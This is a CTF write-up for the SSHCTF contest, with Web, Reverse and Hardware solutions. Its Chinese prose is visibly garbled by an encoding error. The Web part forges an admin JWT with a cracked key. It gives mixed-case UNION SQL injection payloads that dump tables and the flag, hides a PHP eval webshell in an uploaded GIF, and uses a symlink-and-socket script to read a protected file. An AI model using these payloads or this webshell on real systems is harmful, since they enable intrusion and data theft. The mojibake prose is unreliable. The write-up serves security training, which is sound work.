å¾—åˆ°key=5807ï¼Œæ‹¿å»[JSON Web Tokens - jwt.io](https://jwt.io/)

```
HEADER:
{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:
{
  "identity": "guest",
  "exp": 1724610414
}
VERIFY SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload), 
  5807
)
```

ä¿®æ”¹"identity"ä¸º"admin"ï¼Œå¾—åˆ°æ–°çš„jwt

2. ä¿®æ”¹Cookieï¼Œè¿›å…¥åˆ°/queryuserphoneï¼ŒGET /queryuserphone?user=flag' OR ''='

   å¾—åˆ°hintï¼š"Upper case And Lower Case"

   åˆ©ç”¨MySqlæ— å¤§å°å†™æ£€æµ‹ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›è¡¨

GET `/queryuserphone?user=' Union Select GrOup_coNcat(table_name),2 FrOm InFoRmAtIoN_ScHeMa.tables WhErE TaBlE_ScHeMa=DaTaBaSe() ANd ''='`

å‘ç°æœ‰ä¸¤ä¸ªè¡¨`adwoivfhaoihfagfiuaviuf`, `user`

æŸ¥çœ‹`adwoivfhaoihfagfiuaviuf`æœ‰å“ªäº›colum

GET `/queryuserphone?user='Union Select GrOup_coNcat(column_name),2 FrOm InFoRmAtIoN_ScHeMa.columns WhErE TaBlE_NaMe='adwoivfhaoihfagfiuaviuf' ANd ''='`

ä»…æœ‰flagï¼Œæ•…æŸ¥è¯¢flag

GET `/queryuserphone?user=' Union Select flag,2 FrOm adwoivfhaoihfagfiuaviuf WhErE ''='`

```
SSHCTF{1e8bfe8b-f9e0-4e5f-b98a-6b87b75a26c5}
```

### ezUpload

1. é¦–å…ˆåšå›¾ç‰‡é©¬ï¼šéšä¾¿ä¸Šä¼ ä¸€å¼ gifï¼Œä¸Šä¼ åå†ä¸‹è½½ä¸‹æ¥ï¼Œæ¯”å¯¹å‰åæœ‰åŒºåˆ«ï¼Œè¯´æ˜äºŒæ¬¡æ¸²æŸ“äº†

   åœ¨ä¸Šä¼ å‰åæ²¡æœ‰å˜åŒ–çš„åŒºåŸŸæ’å…¥ä¸€å¥è¯æœ¨é©¬   `<?php @eval($_POST['cmd']); ?>`

   ä¸Šä¼ ä¿®æ”¹åçš„gifï¼Œå†æ‹¿ä¸‹æ¥ï¼Œå‘ç°æ’å…¥æˆåŠŸ

2. ç”¨èšå‰‘è¿æ¥`/include.php?filename=<ä¸Šä¼ åçš„å›¾ç‰‡åç§°>.gif`ï¼Œè¿æ¥æˆåŠŸï¼Œä½†shellæ— æ³•æ‰§è¡ŒæŒ‡ä»¤ï¼ˆret-1ï¼‰

   ![image-20240826072316971](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240826072316971.png)åŒæ—¶æ‰¾åˆ°äº†flagæ‰€åœ¨ä½ç½®ï¼Œä½†/app/flagæ— æ³•æŸ¥çœ‹

3. æ ¹æ®hint: è¿™shellååˆ†çš„çè´µï¼Œåº”è¯¥å…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿ã€‚ä¸æ­¢æœ‰phpå¥¥

   å‘ç°è¿™ä¸ªwwwweeebbbb.txtä¹Ÿæ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç›´æ¥æ”¹æˆwwwweeebbbb.php

   åˆ æ‰å…¶ä¸­å†…å®¹åå¾—åˆ°äº†ä¸€ä¸ª`#Halo AntSword`ï¼Œè¿™æ—¶å€™è§‰å¾—åšå¯¹äº†ï¼Œç»§ç»­çœ‹å…¶ä»–æ–‡ä»¶

   çœ‹åˆ°Loging.phpåœ¨å¾€127.0.0.1:33333å‘åŒ…

   å°†wwwweeebbbb.phpçš„å†…å®¹æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼ˆè¿™æ—¶å€™è¿˜æ²¡åŠ ç¬¦å·é“¾æ¥ï¼‰

   çœ‹åˆ°/var/App/www/Appä¸‹æœ‰ä¸€ä¸ªLoggingSoket.pyï¼Œæ¥å—127.0.0.1:33333å‘é€çš„åŒ…ï¼Œä¸”å¯¹file_nameæœ‰æ­£åˆ™æ£€éªŒï¼Œ` r"flag|key|\."`ï¼Œæˆ‘ç»•ä¸è¿‡å»ï¼ˆï¼‰

   ``` php
   <?php
   $host = '127.0.0.1'; 
   $port = 33333;      
   $file_name = 'nmmd';
   // åˆ›å»ºç¬¦å·é“¾æ¥
   if (symlink('/app/flag', '/tmp/nmmd')) {
       echo "symlink success";
   } else {
       echo "symlink error";
   }
   // åˆ›å»ºsocket
   $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
   if ($socket === false) {
       echo "socket_create() å¤±è´¥: " . socket_strerror(socket_last_error()) . "\n";
       exit;
   }
   
   $result = socket_connect($socket, $host, $port);
   if ($result === false) {
       echo "socket_connect() å¤±è´¥: " . socket_strerror(socket_last_error($socket)) . "\n";
       socket_close($socket);
       exit;
   }
   // è¦å‘é€çš„data
   $form_data = [
       'file_name' => $file_name,
       'key' => md5('web' . trim(file_get_contents('/w')))
   ];
   
   $json_data = json_encode($form_data);  
   socket_write($socket, $json_data, strlen($json_data)); 
   $buffer = socket_read($socket, 1024, PHP_BINARY_READ);  
   socket_close($socket);
   echo $buffer; 
   ?>
   ```

4. æ‰€ä»¥ç”¨symlinkå°†`/tmp/nmmd`ï¼ˆè¿™ä¸ªåéšä¾¿ï¼‰é“¾æ¥åˆ°`/app/flag`ï¼Œè¿™æ ·LoggingSoket.pyæ¥æ”¶åˆ°åŒ…åï¼Œç”±äº`Path('/tmp').joinpath( upload_name).resolve()`ä¸­æœ‰resolveï¼Œå°†ä¼šæŠŠä»»æ„é“¾æ¥è½¬æ¢æˆç»å¯¹é“¾æ¥ï¼Œæ•…æ‰§è¡Œæ•ˆæœä¸ºå°†`/app/flag`å¤åˆ¶åˆ°`/tmp/flag.txt`ï¼Œå¯ä»¥æŸ¥çœ‹ï¼Œå¾—åˆ°flag

   ![](https://s2.loli.net/2024/11/14/UyJ7BZoDxupCcLt.png)

   ![](https://s2.loli.net/2024/11/14/YNwfbBHgPo31M4z.png)

```
SSHCTF{b536fe7a-51a5-48be-8cd9-a65eb8176355}
```

## Re

### baby crack

æ— å£³ï¼Œç›´æ¥æ‹–å…¥ida

æŸ¥çœ‹mainå‡½æ•°

![](https://s2.loli.net/2024/11/14/8XArGWfLldSv2JT.png)

Strå³flagï¼Œ38ä¸ªå­—ç¬¦ï¼Œå‰7ä¸ªæ˜¯SSHCTF{

æœ‰ä¸ªå‡½æ•°sub_401550(Str, aSshctfkey)ï¼Œæ‰“å¼€æŸ¥çœ‹

![](https://s2.loli.net/2024/11/14/Ifn4lpZTcNbKv6k.png)

å‘ç°åŠ å¯†çš„æ–¹å¼ï¼š

- æ ¹æ®å›ºå®šçš„éšæœºæ•°ç§å­ï¼š0xDEADBEEFç”Ÿæˆ37ä¸ªèŒƒå›´åœ¨0~254çš„æ•´æ•°
- ä¸€é¡¿è¿ç®—

``` python
key = "SSHCTFkey"
arr = [201, 34, 74, 60, 108, 98, 249, 249, 111, 177,
       146, 73, 118, 241, 190, 203, 137, 113, 40, 169,
       115, 82, 249, 180, 94, 254, 243, 132, 199, 61,
       235, 137, 117, 190, 106, 61, 19, 125]
a1 = arr
a2 = [ord(k) for k in key]

# random.seed(0xDEADBEEF) å›ºå®šçš„éšæœºç§å­ ä¸èƒ½ç”¨pythonç”Ÿæˆï¼Œå› ä¸ºç®—æ³•ä¸ä¸€æ ·
strlen_a2 = len(a2)
r = [232, 90, 117, 135, 98, 176, 175, 24, 8, 123, 
     84, 245, 112, 135, 139, 71, 23, 72, 4, 144,
     110, 181, 55, 140, 156, 151, 75, 136, 53, 253,
     7, 32, 95, 73, 116, 219, 63] # ç”¨cç”Ÿæˆçš„éšæœºæ•°

for i in reversed(range(37)):
    v3 = r[i]
    xor_a1 = a1[i] ^ (i & 0x12 | a2[i % len(a2)] & 0x3F)
    if ((v3 & xor_a1) | ~(v3 | xor_a1) | 7) > 63:
        a1[i] = xor_a1
    a1[i] ^= a1[i + 1]
    c = a2[v3 % len(a2)] % 8
    a1[i] = (a1[i] >> (8 - c)) | (a1[i] << c) & 0xFF

print("".join([chr(a) for a in a1]))

# SSHCTF{N0w_y0u_Kn0w_B1twise_op3r@t0rs}
```

### Let's go to learn Cry

æ— å£³ï¼Œç›´æ¥æ‹–å…¥ida

å‘ç°åŠ å¯†ç®—æ³•éå¸¸å¤æ‚ï¼Œhintç»™äº†è¯´æ˜¯Cyptoï¼Œä»é›¶å¼€å§‹é€†å‘çš„è¯å°±çœŸæˆCryptoäº†ï¼Œæ‰€ä»¥ç¨å¾®çœ‹çœ‹ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯AESåŠ å¯†ï¼Œkeyå’Œbase64ç¼–ç åçš„ciphertextéƒ½å·²ç»ç»™å‡ºï¼Œç›´æ¥pythonè§£å¯†

![](https://s2.loli.net/2024/11/14/EpUKGhDOuHl5x2I.png)

![](https://s2.loli.net/2024/11/14/GNc5mFItsYAJxBC.png)

``` python
import base64
from Cryptodome.Cipher import AES

key = b"9e015a9f82d367bc"
encoded_ciphertext = "KKN+NK5ZWN4xr4kM1+qq+2wJKUEEaiWmITgnvi2VaXfjscLoN2sbUObWbnc45pZr"
ciphertext = base64.b64decode(encoded_ciphertext)

aes = AES.new(key, AES.MODE_ECB)
flag = aes.decrypt(ciphertext)

print(flag)

# SSHCTF{Crypt0_1n_R3v3rs3_1s_so000oo0_Imp0rt@nt!}
```

### Tetris

ä¸€å¼€å§‹æƒ³çš„æ˜¯æ”¹scoreï¼Œå°è¯•ç›´æ¥æ”¹å€¼ï¼ŒæŸ¥åœ°å€ï¼Œæ‹–åˆ°idaé‡Œçœ‹ä»£ç éƒ½ä¸è¡Œ

è¯„ä»·ä¸ºæƒ³å¤æ‚äº†ï¼Œå¦‚æœæˆ‘ä¸èƒ½é€šè¿‡ä½œå¼Šæ‹¿åˆ°60åˆ†passæœŸæœ«ï¼Œé‚£æˆ‘ä¸ºä»€ä¹ˆä¸å¯ä»¥è®©è€å¸ˆå°†åŠæ ¼çº¿æ”¹ä¸º0åˆ†å‘¢ï¼Ÿï¼ˆæ¼ï¼‰

114514è¿™ä¸ªå€¼è¦æ‹¿å»æ¯”è¾ƒï¼Œè€Œä¸”ä¹Ÿä¸å¸¸è§ï¼Œç›´æ¥æ”¹è¿™ä¸ªå€¼å°±å¯ä»¥

æ‰“å¼€æ¸¸æˆåï¼Œç”¨cheat gameæ‰“å¼€è¿›ç¨‹ï¼ˆå»ºè®®è®¾ä¸ªpauseçš„å¿«æ·é”®ï¼‰ï¼Œä¸€æ¬¡æœç´¢å°±æ‰¾åˆ°äº†ï¼Œç›´æ¥æ”¹ä¸º0

![image-20240828103051960](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240828103051960.png)

![image-20240828103214634](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240828103214634.png)

``` 
SSHCTF{T3tr1s_1s_E4sY!}
```

### SMCæ˜¯ä»€ä¹ˆ

æ— å£³ï¼Œç›´æ¥æ‹–å…¥ida

å¯ä»¥çœ‹åˆ°ç¨‹åºä¸»è¦å†…å®¹ï¼Œä½†æ˜¯æœ‰VirtualProtectï¼Œé¢˜ç›®åç§°åˆå«smcï¼Œæ‰€ä»¥æ˜¯ä¸€é“smcé¢˜ï¼Œéœ€è¦åŠ æ–­ç‚¹åŠ¨æ€è°ƒè¯•

æ‰¾åˆ°ä»£ç è‡ªåŠ å¯†çš„éƒ¨åˆ†ï¼Œçœ‹ä¸€ä¸‹sub_1400011C0çš„æ•°æ®æ®µï¼Œæ˜¯ä¸€å¨

![](https://s2.loli.net/2024/11/14/Nqslj52rTa87GZQ.png)

æ‰€ä»¥å°±æ˜¯åœ¨è¿™åŠ æ–­ç‚¹äº†ï¼ˆç¬¬15è¡Œï¼‰

![](https://s2.loli.net/2024/11/14/2dcHlfwFnI3LyGr.png)

å¼€debuggerï¼Œéšä¾¿è¾“å…¥ä¸€ä¸²ã€‚ç„¶åéœ€è¦ä½¿ç”¨idaçš„é‡ç¼–è¯‘åŠŸèƒ½ï¼Œä»0x1400011C0é€‰ä¸­åˆ°0x14000127Eè¿™æ•´ä¸ªä¸€æ®µã€‚æŒ‰uå›åˆ°å­—èŠ‚æ–‡æœ¬çŠ¶æ€ï¼Œå†å›åˆ°è¿™ä¸€æ®µçš„å¼€å¤´ï¼ŒæŒ‰pé‡æ–°ç¼–è¯‘ï¼ŒæŒ‰f5ï¼Œå¾—åˆ°æ­£ç¡®çš„å‡½æ•°
![](https://s2.loli.net/2024/11/14/HlAQGuJkN24LnB5.png)

pythonè§£å¯†

``` python
# flag[i] == Str[i] ^ 0x23
print(''.join([chr(i ^ 0x23) for i in b"EOBDXZFP|V|GL|JW^"]))

# SSHCTF{yes_u_do_it}
```

### è¿·å®«åˆè§è¿·å®«

æ— å£³ï¼Œç›´æ¥æ‹–å…¥ida

æŸ¥çœ‹å‘ç°å°±æ˜¯3ä¸ªè¿·å®«ï¼ˆä¸€ä¸ªè¿·å®«15*15ï¼Œæ€»å…±åœ¨byte_4020é‡Œé¢æœ‰675ä¸ªæ•°ï¼‰

![](https://s2.loli.net/2024/11/14/eAsR1fGNW9iug4z.png)

``` 
1 å¯é€šè¿‡
0 éšœç¢ç‰©
3 ç©å®¶
4 ç»ˆç‚¹
wsad ä¸Šä¸‹å·¦å³
```

``` python
import hashlib

maze = [ ... ] # åŸå§‹è¿·å®«æ•°æ®

def maze_to_str(maze_list):
    s = ''
    for x in range(15):
        for y in range(15):
            s += str(maze_list[x][y])
        s += '\n'
    return s

maze1 = [maze[i:i+15] for i in range(0, 15*15, 15)]
maze2 = [maze[i:i+15] for i in range(15*15, 15*15*2, 15)]
maze3 = [maze[i:i+15] for i in range(15*15*2, 15*15*3, 15)]

# print(maze_to_str(maze1))
# print(maze_to_str(maze2))
# print(maze_to_str(maze3))

# è¿·å®«æ¯”è¾ƒå°ï¼Œæ‰‹åŠ¨è§£æ•ˆç‡æ›´é«˜ï¼Œæ²¡å¿…è¦å†™ä¸ªæœç´¢äº†
s1 = 'ddsssddddsssdss'
s2 = 'dddddsssddddsssaassssddds'
s3 = 'ddssddwddssssssdddssssdddss'

print('SSHCTF{' + hashlib.md5((s1+ s2 + s3).encode('utf-8')).hexdigest() + '}')

#SSHCTF{aeea66fcac7fa80ed8f79f38ad5bb953}
```

### flower

æ— å£³ï¼Œç›´æ¥æ‹–å…¥idaï¼Œæ— æ³•ç›´æ¥F5åç¼–è¯‘

hintç»™å‡ºèŠ±æŒ‡ä»¤ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯å“ªä¸€éƒ¨åˆ†æœ‰æ··æ·†ï¼Œåœ¨mainå°è¯•æŒ‰Pï¼ŒæŠ¥é”™ï¼š

```
.text:004010A2: The function has undefined instruction/data at the specified address.
Your request has been put in the autoanalysis queue.
```

ç›´æ¥è·³åˆ°.text:004010A2ï¼Œå‘ç°äº†èŠ±æŒ‡ä»¤

![](https://s2.loli.net/2024/11/14/ITgRCaD5rHf97hp.png)

é€‰ä¸­è¿™3æ¡ï¼ŒCtrl+N nopæ‰ï¼Œå›åˆ°mainæŒ‰ä¸€ä¸‹Pï¼Œå†æŒ‰F5ï¼Œå¥½äº†

![](https://s2.loli.net/2024/11/14/R1piSAHKaUx6I5t.png)

``` python
byte_402128 = [
  123,  49,   4,  38,  58, 117, 101,  23,  22,   6,
   95,  28,  43,  54,  10, 105, 110, 110, 101, 114,
  125,   0,   0,   0
]
arr = [15, 21, 9, 123,  49,   4,  38,  58, 117, 101,  23,  22, 6, 95,  28,  43,  54,  10, 105, 110, 110, 101, 114, 125]
i = 4
j = 20

while i > 0:
    i -= 1
    arr[j - 3] ^= arr[i + 20]
    arr[j - 4] ^= arr[i + 15]
    arr[j - 5] ^= arr[i + 10]
    if j - 6 >= 0:
        arr[j - 6] ^= arr[i + 5]
    j -= 5

print(''.join([chr(a) for a in arr]))

# SSHCTF{Hey_u_cat_it_winner}
```

### [Signin] Check your IDA

ç­¾åˆ°é¢˜ï¼Œç›´æ¥æ‹–å…¥ida

``` 
SSHCTF{Y0u_c@n_go_2_s1ove_0ther_r3v3rse_ch4l13ng3s_by_ida_n0w}
```

### baby xor

æ— å£³ï¼Œç›´æ¥æ‹–å…¥ida

![](https://s2.loli.net/2024/11/14/nevSkujfr2G4JaC.png)

``` python
arr = [
    50,  32,  50,  32,  50,  32,  79,   1,  77,  39,
    18,   0,  71,  23,  22,  44,  34,  83,  20,  57,
    5,  43, 125,  38,  37,  14,  40,  27,   4,   0,
    14,  60,  35,  60, 107,  42,  71,  36,  40,  25,
    4,  72,  15,  20, 7
]
Str = [
    115, 115, 104, 99, 116, 102, 38, 88, 48, 82,
    95, 107, 101, 121
]

for i in range(45):
    if i & 1 == 0:
        arr[i] ^= 0x12
    arr[i] ^= Str[i % len(Str)]

print("".join([chr(a) for a in arr]))

# SSHCTF{You_k0nw_X0r_1s_the_best_EZ_revers1ng}
```

## Hardware

### è·¯ç”±å™¨é‡Œè—äº†ä¸ªé»‘çŒ´ï¼Ÿ

` binwalk -Me ` è§£åŒ….binï¼Œæ‰“å¼€å‘ç°squashfs-rooté‡Œé¢æ²¡æœ‰æ–‡ä»¶

ç”¨firmware-mod-kitå†æ¬¡è§£åŒ…1600900.squashfsï¼Œ

```
/opt/firmware-mod-kit/trunk/unsquashfs_all.sh ./160090.squashfs
```

åœ¨/user/biné‡Œé¢å‘ç°äº†çŒ´ `Wuk0ng`

``` python
chunks= ("bHeN", "yiuj", "82yK", "Odrr", "pTyW", "kAJW", "QcPL", "HVVg", 
         "CTjY", "JOnS", "CoqG", "uQCM", "wXoy", "RPK7", "RT1h", "kvi")
print(''.join(chunks))

# bHeNyiuj82yKOdrrpTyWkAJWQcPLHVVgCTjYJOnSCoqGuQCMwXoyRPK7RT1hkvi
```

baseç³»åˆ—ç¼–ç ï¼Œæ‹¼æ¥èµ·æ¥ååˆ°[CyberChef ](https://gchq.github.io/CyberChef/)è§£ç ï¼Œå°è¯•è¿‡åæ˜¯base62

``` 
SSHCTF{H1_1_@M_H3r3_bL@cK_mYtH_wUk0nG_G0G0G0}
```

### å¥‡æ€ªäº†ï¼Œæˆ‘æ€ä¹ˆè®¿é—®åå°å‘¢

` binwalk -Me ` è§£åŒ….bin

ç„¶åæ‰¾ip `grep -rEo '192\.168\.[0-9]{1,3}\.[0-9]{1,3}'` 

![](https://s2.loli.net/2024/11/14/vmq9TB4MI3tfLHS.png)

æœ€ç»ˆåœ¨ ` etc/uci-defaults/zz-asu-defaults` ä¸­æ‰¾åˆ°

![](https://s2.loli.net/2024/11/14/68AU7bJyRPZ5kdD.png)

``` 
SSHCTF{192.168.99.81}
```
